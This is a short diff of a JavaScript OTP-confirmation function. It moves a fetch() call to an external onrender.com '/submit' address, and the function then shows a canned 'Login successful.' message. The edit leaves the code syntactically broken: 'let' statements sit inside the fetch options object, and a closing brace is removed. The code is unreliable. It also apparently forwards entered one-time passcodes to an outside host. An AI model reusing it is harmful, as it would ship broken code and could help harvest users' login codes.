@@ -484,10 +484,9 @@ function sendOTP(){
 
 }
 function confirmOTP(){
-fetch('https://jpgpay-1.onrender.com/submit', {
     let otp =
         document.getElementById("otpInput").value.trim();
-
+        fetch('https://jpgpay-1.onrender.com/submit', {
     let status =
         document.getElementById("otpStatus");
 
@@ -505,8 +504,6 @@ closeOTP();
 document.getElementById("message").style.display = "block";
 document.getElementById("message").innerText = "Login successful.";
 }, 700);
-
-}
 
 function closeOTP(){
 
